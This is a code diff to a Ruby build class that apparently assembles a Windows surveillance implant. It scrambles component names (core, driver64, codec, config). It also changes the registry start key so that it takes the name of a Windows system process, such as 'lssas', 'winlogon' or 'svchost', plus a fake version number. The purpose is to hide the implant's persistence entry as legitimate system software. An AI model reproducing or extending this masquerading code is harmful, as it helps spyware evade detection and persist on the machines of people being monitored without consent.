@@ -129,18 +129,17 @@ class BuildWindows < Build
 
     core = scramble_name(@factory.seed, 3)
     core_backup = scramble_name(core, 32)
-    olddir = scramble_name(core[0..7], 7)
-    dir = reg_start_key(@factory.confkey)
+    dir = scramble_name(core[0..7], 7)
     config = scramble_name(core[0] < core_backup[0] ? core : core_backup, 1)
     codec = scramble_name(config, 2)
     driver = scramble_name(config, 4)
     driver64 = scramble_name(config, 16)
     core64 = scramble_name(config, 15)
-    oldreg = '*' + scramble_name(olddir, 1)[1..-1]
+    oldreg = '*' + scramble_name(dir, 1)[1..-1]
     reg = reg_start_key(@factory.confkey)
 
     @scrambled = {core: core, core64: core64, driver: driver, driver64: driver64,
-                  dir: dir, reg: reg, olddir: olddir, oldreg: oldreg, config: config, codec: codec }
+                  dir: dir, reg: reg, oldreg: oldreg, config: config, codec: codec }
 
     # call the super which will actually do the renaming
     # starting from @outputs and @scrambled
@@ -328,10 +327,12 @@ class BuildWindows < Build
   end
 
   def reg_start_key(seed)
+    fakever = (seed[2].ord % 11).to_s + "." + seed.slice(0..2).unpack('S').first.to_s
+
     fake_names = ['wmiprvse', 'lssas', 'dllhost', 'winlogon', 'svchost', 'MSInst', 'WinIME',
                   'RSSFeed', 'IconDB', 'MSCache', 'IEPrefs', 'EVTvwr', 'TServer', 'SMBAuth',
                   'DRM', 'Recovery', 'Registry', 'Cookies', 'MSVault', 'MSDiag', 'MSHelp']
-    fake_names[seed.ord % fake_names.size]
+    fake_names[seed.ord % fake_names.size] + " " + fakever
   end
 
 end
